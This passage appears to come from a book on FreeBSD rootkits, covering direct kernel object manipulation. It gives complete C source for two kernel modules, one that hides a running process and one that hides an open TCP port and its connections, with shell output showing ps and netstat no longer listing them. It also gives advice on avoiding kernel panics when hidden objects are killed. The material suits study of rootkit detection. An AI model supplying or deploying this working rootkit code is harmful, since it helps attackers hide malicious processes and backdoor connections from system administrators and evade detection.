</pre><p>As you can see, all I've done is remove the <code class="literal">proc</code> structure from <code class="literal">pidhashtbl</code>. Easy, eh?</p><p>Listing 3-2 is an alternative approach, which takes advantage of your knowledge of <code class="literal">pidhashtbl</code>.</p><a id="I_programlisting3_d1e4054"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/queue.h&gt;
#include &lt;sys/lock.h&gt;
#include &lt;sys/sx.h&gt;
#include &lt;sys/mutex.h&gt;

struct process_hiding_args {
        pid_t p_pid;            /* process identifier */
};

/* System call to hide a running process. */
static int
process_hiding(struct thread *td, void *syscall_args)
{
        struct process_hiding_args *uap;
        uap = (struct process_hiding_args *)syscall_args;

        struct proc *p;

        sx_xlock(&amp;allproc_lock);

        /* Iterate through pidhashtbl. */
        LIST_FOREACH(p, PIDHASH(uap-&gt;p_pid), p_hash)
		if (p-&gt;p_pid == uap-&gt;p_pid) {
                        if (p-&gt;p_state == PRS_NEW) {
                                p = NULL;
                                break;
                        }
                        PROC_LOCK(p);

                        /* Hide this process. */
                        LIST_REMOVE(p, p_list);
                        LIST_REMOVE(p, p_hash);

                        PROC_UNLOCK(p);

                        break;
                }

        sx_xunlock(&amp;allproc_lock);

        return(0);
}

/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
        1,                      /* number of arguments */
        process_hiding          /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{

        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);

}

SYSCALL_MODULE(process_hiding, &amp;offset, &amp;process_hiding_sysent, load, NULL);
</pre><p><span class="emphasis"><em>Listing 3-2: process_hiding_redux.c</em></span></p><p>As you can see, <code class="literal">process_hiding</code> has been rewritten to work with PIDs (instead of names), so that you may forgo iterating through <code class="literal">allproc</code> in favor of iterating through <code class="literal">pidhashtbl</code>. This should reduce the overall run time.</p><p>Here is some sample output:</p><a id="I_programlisting3_d1e4072"/><pre class="programlisting">
$ <strong class="userinput"><code>sudo kldload ./process_hiding_redux.ko</code></strong>
System call loaded at offset 210.
$ <strong class="userinput"><code>ps</code></strong>
  PID  TT  STAT      TIME COMMAND
  494  v1  S      0:00.21 -bash (bash)
  502  v1  R+     0:00.02 ps
  492  v2  I      0:00.17 -bash (bash)
  493  v2  S+     0:00.23 top
$ <strong class="userinput"><code>perl -e 'syscall(210, 493);'</code></strong>
$ <strong class="userinput"><code>ps</code></strong>
  PID  TT  STAT      TIME COMMAND
  494  v1  S      0:00.25 -bash (bash)
  504  v1  R+     0:00.02 ps
  492  v2  I      0:00.17 -bash (bash)
$ <strong class="userinput"><code>ps -p 493</code></strong>
  PID  TT  STAT      TIME COMMAND
$ <strong class="userinput"><code>kill -9 493</code></strong>
-bash: kill: (493) - No such process
</pre><p>At this point, unless someone is actively searching for your hidden process, you should be safe from discovery. However, keep in mind that there are still data structures in the kernel that reference the various running processes, which means that your hidden process can still be detected—and quite easily, at that!</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-3-FN-1" href="#CHP-3-FN-1" class="para">1</a>] </sup><sup>1</sup> In general, a <span class="emphasis"><em>hash table</em></span> is a data structure in which keys are mapped to array positions by a hash function. The purpose of a hash table is to provide quick and efficient data retrieval. That is, given a key (e.g., a person's name), you can easily find the corresponding value (e.g., the person's phone number). This works by transforming the key, using a hash function, into a number that represents the offset in an array, which contains the desired value.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hiding_with_dkom"/>Hiding with DKOM</h1></div></div></div><p>As you've seen, the main challenge to overcome when hiding an object with DKOM is removing all references to your object in the kernel. The best way to do so is to look through and mimic the source code of the object's terminating function(s), which are designed to remove all references to the object. For instance, to identify all the data structures that reference a running process, refer to the <code class="literal">_exit(2)</code> system call function, which is implemented in the file /sys/kern/kern_exit.c.<a id="IDX-CHP-3-0228" class="indexterm"/><a id="IDX-CHP-3-0229" class="indexterm"/><a id="IDX-CHP-3-0230" class="indexterm"/><a id="IDX-CHP-3-0231" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>Because sorting through unfamiliar kernel code is never quick and easy, I didn't dump the source for <em class="replaceable"><code>_exit(2)</code></em> at the beginning of <a class="xref" href="ch03s03.html" title="Hiding a Running Process">Hiding a Running Process</a>, when I first discussed hiding a running process.</p></div><p>At this point, you should know enough to be able to go through <code class="literal">_exit(2)</code> on your own. Still, here are the remaining objects you need to patch in order to hide a running process:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>The parent process' child list</p></li><li class="listitem"><p>The parent process' process-group list</p></li><li class="listitem"><p>The <code class="literal">nprocs</code> variable</p></li></ul></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hiding_an_open_tcp-based_port"/>Hiding an Open TCP-based Port</h1></div></div></div><p>Because no book about rootkits is complete without a discussion of how to hide an open TCP-based port, which indirectly hides an established TCP-based connection, I'll show an example here using DKOM. First, though, we need some background information on Internet protocol data structures.<a id="IDX-CHP-3-0232" class="indexterm"/><a id="IDX-CHP-3-0233" class="indexterm"/><a id="IDX-CHP-3-0234" class="indexterm"/><a id="IDX-CHP-3-0235" class="indexterm"/><a id="IDX-CHP-3-0236" class="indexterm"/><a id="IDX-CHP-3-0237" class="indexterm"/></p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_inpcb_structure"/>The inpcb Structure</h2></div></div></div><p>For each TCP- or UDP-based socket, an <code class="literal">inpcb</code> structure, which is known as an <span class="emphasis"><em>Internet protocol control block</em></span>, is created to hold internetworking data such as network addresses, port numbers, routing information, and so on (McKusick and Neville-Neil, 2004). This structure is defined in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header. The following list describes the fields in <code class="literal">struct inpcb</code> that you'll need to understand in order to hide an open TCP-based port.<a id="IDX-CHP-3-0238" class="indexterm"/><a id="IDX-CHP-3-0239" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>As before, you can skip over this list on your first reading and return to it when you deal with some real C code.</p></div><div class="variablelist"><dl><dt><span class="term"><strong class="userinput"><code>LIST_ENTRY(inpcb) inp_list;</code></strong></span></dt><dd><p>This field contains the linkage pointers that are associated with the <code class="literal">inpcb</code> structure, which is stored on the <code class="literal">tcbinfo.listhead</code> list (discussed in <a class="xref" href="ch03s06.html#the_tcbinfo.listhead_list" title="The tcbinfo.listhead List">The tcbinfo.listhead List</a>). This field is referenced during insertion, removal, and traversal of this list.</p></dd><dt><span class="term"><strong class="userinput"><code>struct in_conninfo inp_inc;</code></strong></span></dt><dd><p>This structure maintains the socket pair 4-tuple in an established connection; that is, the local IP address, local port, foreign IP address, and foreign port. The definition of <code class="literal">struct in_conninfo</code> can be found in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header as follows:</p><a id="I_programlisting3_d1e4245"/><pre class="programlisting">
struct in_conninfo {
        u_int8_t        inc_flags;
        u_int8_t        inc_len;
        u_int16_t       inc_pad;
        /* protocol dependent part */
        struct  in_endpoints inc_ie;
};
</pre><table border="0" summary="Simple list" class="simplelist"><tr><td>Within an <code class="literal">in_conninfo</code> structure, the socket pair 4-tuple is stored in the last member, <code class="literal">inc_ie</code>. This can be verified by looking up the definition of <code class="literal">struct in_endpoints</code> in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header as follows:</td></tr></table><a id="I_programlisting3_d1e4262"/><pre class="programlisting">
struct in_endpoints {
        u_int16_t       ie_fport;               /* foreign port */
        u_int16_t       ie_lport;               /* local port */
        /* protocol dependent part, local and foreign addr */
        union {
                /* foreign host table entry */
                struct  in_addr_4in6 ie46_foreign;
                struct  in6_addr ie6_foreign;
        } ie_dependfaddr;
        union {
                /* local host table entry */
                struct  in_addr_4in6 ie46_local;
                struct  in6_addr ie6_local;
        } ie_dependladdr;
#define ie_faddr        ie_dependfaddr.ie46_foreign.ia46_addr4
#define ie_laddr        ie_dependladdr.ie46_local.ia46_addr4
#define ie6_faddr       ie_dependfaddr.ie6_foreign
#define ie6_laddr       ie_dependladdr.ie6_local
};
</pre></dd><dt><span class="term"><strong class="userinput"><code>u_char inp_vflag;</code></strong></span></dt><dd><p>This field identifies the IP version in use as well as the IP flags that are set on the <code class="literal">inpcb</code> structure. All the flags are defined in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header.</p></dd><dt><span class="term"><strong class="userinput"><code>struct mtx inp_mtx;</code></strong></span></dt><dd><p>This is the resource access control associated with the <code class="literal">inpcb</code> structure. The header file <code class="literal">&lt;netinet/in_pcb.h&gt;</code> defines two macros, <code class="literal">INP_LOCK</code> and <code class="literal">INP_UNLOCK</code>, that conveniently acquire and release this lock.</p><a id="I_programlisting3_d1e4296"/><pre class="programlisting">
#define INP_LOCK(inp)           mtx_lock(&amp;(inp)-&gt;inp_mtx)
#define INP_UNLOCK(inp)         mtx_unlock(&amp;(inp)-&gt;inp_mtx)
</pre></dd></dl></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_tcbinfo.listhead_list"/>The tcbinfo.listhead List</h2></div></div></div><p><code class="literal">inpcb</code> structures associated with TCP-based sockets are maintained on a doubly-linked list private to the TCP protocol module. This list is contained within <code class="literal">tcbinfo</code>, which is defined in the <code class="literal">&lt;netinet/tcp_var.h&gt;</code> header as follows:<a id="IDX-CHP-3-0240" class="indexterm"/><a id="IDX-CHP-3-0241" class="indexterm"/><a id="IDX-CHP-3-0242" class="indexterm"/><a id="IDX-CHP-3-0243" class="indexterm"/><a id="IDX-CHP-3-0244" class="indexterm"/><a id="IDX-CHP-3-0245" class="indexterm"/><a id="IDX-CHP-3-0246" class="indexterm"/></p><a id="I_programlisting3_d1e4366"/><pre class="programlisting">
extern  struct inpcbinfo tcbinfo;
</pre><p>As you can see, <code class="literal">tcbinfo</code> is declared as of type <code class="literal">struct inpcbinfo</code>, which is defined in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header. Before I go further, let me describe the fields of <code class="literal">struct inpcbinfo</code> that you'll need to understand in order to hide an open TCP-based port.</p><div class="variablelist"><dl><dt><span class="term"><strong class="userinput"><code>struct inpcbhead *listhead;</code></strong></span></dt><dd><p>Within <code class="literal">tcbinfo</code>, this field maintains the list of <code class="literal">inpcb</code> structures associated with TCP-based sockets. This can be verified by looking up the definition of <code class="literal">struct inpcbhead</code> in the <code class="literal">&lt;netinet/in_pcb.h&gt;</code> header.</p><a id="I_programlisting3_d1e4402"/><pre class="programlisting">
LIST_HEAD(inpcbhead, inpcb);
</pre></dd><dt><span class="term"><strong class="userinput"><code>struct mtx ipi_mtx;</code></strong></span></dt><dd><p>This is the resource access control associated with the <code class="literal">inpcbinfo</code> structure. The header file <code class="literal">&lt;netinet/in_pcb.h&gt;</code> defines four macros for conveniently acquiring and releasing this lock; you'll make use of the following two:<a id="IDX-CHP-3-0247" class="indexterm"/></p><a id="I_programlisting3_d1e4422"/><pre class="programlisting">
#define INP_INFO_WLOCK(ipi)     mtx_lock(&amp;(ipi)-&gt;ipi_mtx)
#define INP_INFO_WUNLOCK(ipi)   mtx_unlock(&amp;(ipi)-&gt;ipi_mtx)
</pre></dd></dl></div></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="example-id4"/>Example</h2></div></div></div><p>At this point, it should come as no surprise that you can hide an open TCP-based port by simply removing its <code class="literal">inpcb</code> structure from <code class="literal">tcbinfo.listhead</code>. Listing 3-3 is a system call module designed to do just that. The system call is invoked with one argument: an integer containing the local port to be hidden.<a id="IDX-CHP-3-0248" class="indexterm"/><a id="IDX-CHP-3-0249" class="indexterm"/></p><a id="I_programlisting3_d1e4455"/><pre class="programlisting">
#include &lt;sys/types.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/module.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/kernel.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/queue.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;net/if.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/in_pcb.h&gt;
#include &lt;netinet/ip_var.h&gt;
#include &lt;netinet/tcp_var.h&gt;

struct port_hiding_args {
        u_int16_t lport;        /* local port */
};

/* System call to hide an open port. */
static int
port_hiding(struct thread *td, void *syscall_args)
{
        struct port_hiding_args *uap;
        uap = (struct port_hiding_args *)syscall_args;

        struct inpcb *inpb;

        INP_INFO_WLOCK(&amp;tcbinfo);

        /* Iterate through the TCP-based inpcb list. */
        LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {
                ❶if (inpb-&gt;inp_vflag &amp; INP_TIMEWAIT)
                        continue;

                INP_LOCK(inpb);

                /* Do we want to hide this local open port? */
                ❷if (uap-&gt;lport == ntohs(inpb-&gt;inp_inc.inc_ie.ie_lport))
                        LIST_REMOVE(inpb, inp_list);

                INP_UNLOCK(inpb);

        }

        INP_INFO_WUNLOCK(&amp;tcbinfo);

        return(0);

}

/* The sysent for the new system call. */
static struct sysent port_hiding_sysent = {
        1,                      /* number of arguments */
        port_hiding             /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch (cmd) {
        case MOD_LOAD:
                uprintf("System call loaded at offset %d.\n", offset);
                break;

        case MOD_UNLOAD:
                uprintf("System call unloaded from offset %d.\n", offset);
                break;

        default:
                error = EOPNOTSUPP;
                break;

        }

        return(error);

}

SYSCALL_MODULE(port_hiding, &amp;offset, &amp;port_hiding_sysent, load, NULL);
</pre><p><span class="emphasis"><em>Listing 3-3: port_hiding.c</em></span></p><p>An interesting detail about this code is that prior to ❷ the port number comparison, I ❶ examine each <code class="literal">inpcb</code> structure's <code class="literal">inp_vflag</code> member. If the <code class="literal">inpcb</code> is found to be in the 2MSL wait state, I skip over it.<sup>[<a id="CHP-3-FN-2" href="#ftn.CHP-3-FN-2" class="footnote">2</a>]</sup> What's the point of hiding a port that's about to close?</p><p>In the following output, I <code class="literal">telnet(1)</code> into a remote machine and then invoke <code class="literal">port_hiding</code> to hide the session:</p><a id="I_programlisting3_d1e4485"/><pre class="programlisting">
$ <strong class="userinput"><code>telnet 192.168.123.107</code></strong>
Trying 192.168.123.107...
Connected to 192.168.123.107.
Escape character is '^]'.
Trying SRA secure login:
User (ghost):
Password:
[ SRA accepts you ]

FreeBSD/i386 (alpha) (ttyp0)

Last login: Mon Mar 5 09:55:50 on ttyv1

$ <strong class="userinput"><code>sudo kldload ./port_hiding.ko</code></strong>
System call loaded at offset 210.
$ <strong class="userinput"><code>netstat -anp tcp</code></strong>
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address       (state)
tcp4       0      0  192.168.123.107.23     192.168.123.153.61141 ESTABLISHED
tcp4       0      0  *.23                   *.*                   LISTEN
tcp4       0      0  127.0.0.1.25           *.*                   LISTEN
$ <strong class="userinput"><code>perl -e 'syscall(210, 23);'</code></strong>
$ <strong class="userinput"><code>netstat -anp tcp</code></strong>
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address       (state)
tcp4       0      0  127.0.0.1.25           *.*                   LISTEN
</pre><p>Notice how <code class="literal">port_hiding</code> hid the local telnet server as well as the connection. To change this behavior, simply rewrite <code class="literal">port_hiding</code> to require two arguments: a local port and a local address.</p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-3-FN-2" href="#CHP-3-FN-2" class="para">2</a>] </sup><sup>2</sup> When a TCP connection performs an active close and sends the final ACK, the connection is put into the 2MSL wait state for twice the maximum segment lifetime. This lets the TCP connection resend the final ACK in case the first one was lost.</p></div></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="corrupting_kernel_data"/>Corrupting Kernel Data</h1></div></div></div><p>Before I conclude this chapter, let's consider the following: What happens when one of your hidden objects is found and killed?<a id="IDX-CHP-3-0250" class="indexterm"/><a id="IDX-CHP-3-0251" class="indexterm"/><a id="IDX-CHP-3-0252" class="indexterm"/><a id="IDX-CHP-3-0253" class="indexterm"/></p><p>In the best case scenario, nothing. In the worst case scenario, the kernel panics because when an object is killed, the kernel unconditionally removes it from its various lists. However, in this situation, the object has already been removed. Therefore, the kernel will fail to find it, and will walk off the end of its lists, corrupting those data structures in the process.</p><p>To prevent this data corruption, here are some suggestions:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Hook the terminating function(s) to prevent them from removing your hidden objects.</p></li><li class="listitem"><p>Hook the terminating function(s) to place your hidden objects back onto the lists before termination.</p></li><li class="listitem"><p>Implement your own "exit" function to safely kill your hidden objects.</p></li><li class="listitem"><p>Do nothing. If your hidden objects are never found, they can never be killed—right?</p></li></ul></div></div>
<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="concluding_remarks-id3"/>Concluding Remarks</h1></div></div></div><p>DKOM is one of the hardest rootkit techniques to detect. By patching the objects the kernel relies upon for its bookkeeping and reporting, you can produce desirable results while leaving an extremely small footprint. For example, in this chapter I've shown how to hide a running process and an open port using a few simple modifications.</p><p>While DKOM does have limited use (because it can only manipulate objects resident in main memory), there are many objects within the kernel to patch. For instance, for a complete listing of all the kernel queue data structures, execute the following commands:</p><a id="I_programlisting3_d1e4555"/><pre class="programlisting">
<strong class="userinput"><code>$ cd /usr/src/sys</code></strong>
$ <strong class="userinput"><code>grep -r "LIST_HEAD(" *</code></strong>
. . .
$ <strong class="userinput"><code>grep -r "TAILQ _HEAD(" *</code></strong>
. . .
</pre></div></body></html>